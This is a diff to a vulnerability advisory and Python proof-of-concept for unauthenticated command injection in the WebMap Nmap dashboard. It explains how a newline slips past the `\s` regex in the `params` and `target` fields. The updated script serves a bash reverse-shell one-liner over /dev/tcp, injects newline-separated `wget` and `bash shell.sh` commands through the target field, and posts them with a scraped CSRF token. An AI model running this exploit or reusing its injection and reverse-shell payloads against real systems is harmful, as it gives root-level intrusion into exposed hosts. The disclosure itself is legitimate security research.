@@ -6,7 +6,7 @@
 
 WebMap is an open-source, Docker-deployed dashboard for running and visualizing Nmap scans, with 100K+ Docker Hub pulls, 1.1K+ GitHub stars, and \~300 forks. Its scan endpoint takes user-supplied parameters and passes them straight into a shell command.
 
-A gap in the input validation regex lets an attacker smuggle a newline into that command, breaking out of the intended `nmap` invocation and running arbitrary shell commands as root inside the container, with no authentication required.
+A gap in the input validation regex for the `params` parameter and `target` parameter lets an attacker smuggle a newline into that command, breaking out of the intended `nmap` invocation and running arbitrary shell commands as root inside the container, with no authentication required.
 
 The official Docker deployment instructions bind the service to all network interfaces by default, so anyone who followed the README is likely exposed to the internet.
 
@@ -171,6 +171,8 @@ and re.search(r'^[a-zA-Z0-9\-\.\:\/\s]+$', request.POST['target'])):
 
 The bug is in that `\s`. Python's re module treats `\s` as matching whitespace, tab, `\n`, `\r`, `\f`, and `\v` not just space and tab. A literal newline (`%0a` URL-encoded) satisfies the validation and sails through.
 
+**The `target` parameter is vulnerable too. it also allows the `/` character, so we can skip the `index.html` part and write our file directly which what we will do in the POC.**
+
 The validated value is then interpolated directly into a shell string and executed:
 
 ```python
@@ -289,10 +291,9 @@ This limits access to the local machine and significantly cuts the attack surfac
 WebMap (SabyasachiRana/webmap) unauthenticated RCE PoC
 --------------------------------------------------------
 This PoC:
-  1. Spins up a local HTTP server to host a 
-     bash reverse-shell one-liner disguised as index.html.
+  1. Spins up a local HTTP server to host a bash reverse shell.
   2. Grabs a CSRF token/cookie pair from the target's login page
-  3. Submits a crafted 'params' value that gets concatenated into
+  3. Submits a crafted value for the target parameter that gets concatenated into
      the nmap command line, causing it to wget the payload and execute it via bash.
 
 Author: CalledSTRIKER
@@ -413,18 +414,18 @@ def main():
     revshell_ip, revshell_port = args.revshell_ip, args.revshell_port
 
     tmpdir = tempfile.mkdtemp(prefix="webmap_exploit_")
-    shell_path = os.path.join(tmpdir, "index.html")
+    shell_path = os.path.join(tmpdir, "shell.sh")
     shell_content = (
         f"/bin/bash -c 'sh -i >& /dev/tcp/{revshell_ip}/{revshell_port} 0>&1'\n"
     )
     with open(shell_path, "w") as f:
         f.write(shell_content)
-    print(f"[*] index.html written to {shell_path}")
+    print(f"[*] shell.sh written to {shell_path}")
     print(f"[*] Payload: {shell_content.strip()}")
 
     print(f"[*] Starting HTTP server on {http_server_ip}:{http_server_port} ...")
     httpd = start_http_server(http_server_ip, http_server_port, tmpdir)
-    print(f"[+] HTTP server is up. Serving {shell_path} as index.html")
+    print(f"[+] HTTP server is up. Serving {shell_path}")
     time.sleep(1)
 
     try:
@@ -433,25 +434,25 @@ def main():
         print(f"[+] csrftoken cookie: {csrf_cookie}")
         print(f"[+] csrfmiddlewaretoken: {csrf_token}")
 
-        download_url = f"{http_server_ip}:{http_server_port}"  # without http:// because slashes are blocked
-        params_payload = (
-            "-oA a\n"
-            f"wget -O shell.sh {download_url}\n"
+        download_url = f"{http_server_ip}:{http_server_port}/shell.sh"
+        payload = (
+            "127.0.0.1\n"
+            f"wget http://{download_url}\n"
             "bash shell.sh\n"
         )
-        print(f"[*] Malicious params (raw):\n{repr(params_payload)}")
+        print(f"[*] Payload :\n{repr(payload)}")
 
         data = {
             "csrfmiddlewaretoken": csrf_token,
             "filename": "test",
-            "target": "127.0.0.1",
-            "params": params_payload,
+            "target": payload,
+            "params": "a",
             "schedule": "false",
             "frequency": "1h",
         }
 
         exploit_url = f"http://{target_ip}:{target_port}/api/v1/nmap/scan/new"
-        print(f"[*] Sending malicious POST to {exploit_url} ...")
+        print(f"[*] Sending POST request to {exploit_url} ...")
         resp = session.post(exploit_url, data=data)
         print(f"[+] Response status: {resp.status_code}")
         print(f"[+] Response text: {resp.text[:500]}...")
@@ -465,6 +466,7 @@ def main():
     except Exception as e:
         print(f"[-] Error during exploitation: {e}")
     finally:
+        time.sleep(3)
         print("[*] HTTP server is still running. Press Ctrl+C to stop and clean up.")
         try:
             while True:
